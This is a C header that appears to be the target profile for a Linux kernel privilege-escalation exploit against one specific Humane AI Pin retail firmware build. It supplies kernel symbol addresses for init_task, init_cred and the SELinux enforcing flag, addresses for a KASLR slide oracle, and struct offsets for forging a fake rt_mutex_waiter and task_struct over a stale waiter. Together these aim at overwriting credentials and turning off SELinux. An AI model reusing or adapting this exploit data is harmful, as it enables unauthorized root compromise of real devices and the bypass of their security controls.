/*
 * Humane AI Pin retail 101.000470.45.20 target profile.
 *
 * These link-time addresses were extracted from the embedded kallsyms table
 * in a chip-off boot_a Image.  The uncompressed Image SHA-256 is
 * d4f4e0deb20871fce207f1f095ba1934162081c2f10afaccbb2e6a1e938719fb
 * and its Linux version string exactly matches the connected retail unit:
 * actions-runner@cc457267f047, clang 10.0.7, Mon Nov 4 18:37:23 PST 2024.
 *
 * All addresses below are link-time image addresses.  Runtime addresses are
 * formed only after the current boot's KASLR base has been recovered.
 */
#ifndef TARGET_45_20_H
#define TARGET_45_20_H

#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
#define P0_PAGE_OFFSET 0xffffffc000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa1280000ULL

/* Refuse to run against any other release or kernel build. */
#define TARGET_KERNEL_RELEASE "Linux version 4.14.190-perf"
#define TARGET_SLOT_A_VERSION_MARKER "Mon Nov 4 18:37:23 PST 2024"
#define TARGET_SLOT_B_VERSION_MARKER "Mon Nov 4 18:37:23 PST 2024"

#define PSELECT_WAITER_WORD_SHIFT 16

/*
 * Retail process_vm_rw has different stack geometry from the DEV kernel.
 * Use the native pselect6 result bitmaps, whose paired-build frame geometry
 * places ten controlled qwords exactly over the stale rt_mutex_waiter.
 */
#define TARGET_USE_PSELECT_RESULT_STAMP 1

/* Exact symbols recovered from the retail Image kallsyms table. */
#define INIT_TASK 0xffffff8009dcdb80ULL
#define INIT_CRED 0xffffff8009ddeec0ULL
#define ENTRY_TASK 0xffffff8009b2a0b0ULL
#define PER_CPU_OFFSET 0xffffff8009dbf6d0ULL
#define ROOT_TASK_GROUP 0xffffff8009fe9f00ULL

/* struct selinux_state begins with initialized, enforcing (two bools). */
#define SELINUX_ENFORCING 0xffffff800a4cd001ULL

/*
 * The slide oracle repoints random_table[5].data at loggers[0][1].
 * loggers[0][1] contains &nfulnl_logger after nf_log registration.
 */
#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffff8009dc37c8ULL
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffff8009dc36f0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffff8009ea2098ULL
#define P0_NFULNL_LOGGER_IMAGE_OFF \
  (SLIDE_NFULNL_LOGGER_IMAGE - KIMAGE_TEXT_BASE)

/*
 * Rootless production runs supply a two-anchor KASLR base and do not use
 * tracefs.  Keep the retained worker offset for diagnostic builds.
 */
#define SLIDE_TRACEFS_EVENT_ID 74
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x6878cULL

/* Vendor 4.14 rt_mutex_waiter (0x50 bytes; no wake_state or ww_ctx). */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48
#define TARGET_WAITER_SIZE 0x50
#define TARGET_HAS_WAITER_WAKE_STATE 0
#define TARGET_HAS_WAITER_WW_CTX 0

#define FAKE_WAITER_PI_TREE_ENTRY_OFF WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_PI_TREE_PRIO_OFF WAITER_PRIO_OFF
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF WAITER_DEADLINE_OFF

/* Retail task_struct geometry from the paired build and live SLUB profile. */
#define FAKE_TASK_USAGE_OFF 0x70
#define FAKE_TASK_PRIO_OFF 0xb0
#define FAKE_TASK_NORMAL_PRIO_OFF 0xb8
#define FAKE_TASK_TASK_GROUP_OFF 0x3e8
#define FAKE_TASK_PI_LOCK_OFF 0x8c4
#define FAKE_TASK_PI_WAITERS_OFF 0x8d0
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8e0
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8e8
#define TARGET_HAS_UCLAMP 0

#define TASK_REAL_CRED_OFF 0x7f8
#define TASK_CRED_OFF 0x800

#endif
